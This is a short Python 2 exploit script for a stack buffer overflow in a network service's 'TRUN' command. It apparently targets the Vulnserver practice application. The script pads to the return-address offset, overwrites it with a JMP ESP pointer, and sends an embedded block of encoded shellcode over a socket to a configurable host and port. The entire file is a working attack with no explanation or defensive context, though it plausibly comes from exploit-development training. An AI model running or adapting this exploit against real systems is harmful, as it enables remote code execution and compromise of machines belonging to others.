#!/usr/bin/env python2
import socket
import struct

from PARAMETERS import RHOST, RPORT, offset_eip, buf_totlen, ptr_jmp_esp, sub_esp_10

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

#buf_totlen = 1024
#offset_srp = 146

#ptr_jmp_esp = 0x080414C3

#sub_esp_10 = "\x83\xec\x10"
#or padding = "\x90" * 16
shellcode =  ("\xbf\x50\x74\xec\x7c\xdb\xcb\xd9\x74\x24\xf4\x5e\x2b\xc9"
"\xb1\x52\x31\x7e\x12\x03\x7e\x12\x83\x96\x70\x0e\x89\xea"
"\x91\x4c\x72\x12\x62\x31\xfa\xf7\x53\x71\x98\x7c\xc3\x41"
"\xea\xd0\xe8\x2a\xbe\xc0\x7b\x5e\x17\xe7\xcc\xd5\x41\xc6"
"\xcd\x46\xb1\x49\x4e\x95\xe6\xa9\x6f\x56\xfb\xa8\xa8\x8b"
"\xf6\xf8\x61\xc7\xa5\xec\x06\x9d\x75\x87\x55\x33\xfe\x74"
"\x2d\x32\x2f\x2b\x25\x6d\xef\xca\xea\x05\xa6\xd4\xef\x20"
"\x70\x6f\xdb\xdf\x83\xb9\x15\x1f\x2f\x84\x99\xd2\x31\xc1"
"\x1e\x0d\x44\x3b\x5d\xb0\x5f\xf8\x1f\x6e\xd5\x1a\x87\xe5"
"\x4d\xc6\x39\x29\x0b\x8d\x36\x86\x5f\xc9\x5a\x19\xb3\x62"
"\x66\x92\x32\xa4\xee\xe0\x10\x60\xaa\xb3\x39\x31\x16\x15"
"\x45\x21\xf9\xca\xe3\x2a\x14\x1e\x9e\x71\x71\xd3\x93\x89"
"\x81\x7b\xa3\xfa\xb3\x24\x1f\x94\xff\xad\xb9\x63\xff\x87"
"\x7e\xfb\xfe\x27\x7f\xd2\xc4\x7c\x2f\x4c\xec\xfc\xa4\x8c"
"\x11\x29\x6a\xdc\xbd\x82\xcb\x8c\x7d\x73\xa4\xc6\x71\xac"
"\xd4\xe9\x5b\xc5\x7f\x10\x0c\x2a\xd7\x8c\x48\xc2\x2a\xb0"
"\x41\x4f\xa2\x56\x0b\x7f\xe2\xc1\xa4\xe6\xaf\x99\x55\xe6"
"\x65\xe4\x56\x6c\x8a\x19\x18\x85\xe7\x09\xcd\x65\xb2\x73"
"\x58\x79\x68\x1b\x06\xe8\xf7\xdb\x41\x11\xa0\x8c\x06\xe7"
"\xb9\x58\xbb\x5e\x10\x7e\x46\x06\x5b\x3a\x9d\xfb\x62\xc3"
"\x50\x47\x41\xd3\xac\x48\xcd\x87\x60\x1f\x9b\x71\xc7\xc9"
"\x6d\x2b\x91\xa6\x27\xbb\x64\x85\xf7\xbd\x68\xc0\x81\x21"
"\xd8\xbd\xd7\x5e\xd5\x29\xd0\x27\x0b\xca\x1f\xf2\x8f\xea"
"\xfd\xd6\xe5\x82\x5b\xb3\x47\xcf\x5b\x6e\x8b\xf6\xdf\x9a"
"\x74\x0d\xff\xef\x71\x49\x47\x1c\x08\xc2\x22\x22\xbf\xe3"
"\x66")





buf = ""
buf += "A"*(offset_eip - len(buf)) # padding
buf += struct.pack("<I", ptr_jmp_esp) # SRP overwrite
buf += sub_esp_10 # ESP points here
buf += shellcode
buf += "D"*(buf_totlen - len(buf)) # trailing padding
buf += "\n"

s.send('TRUN /.:/'+buf)
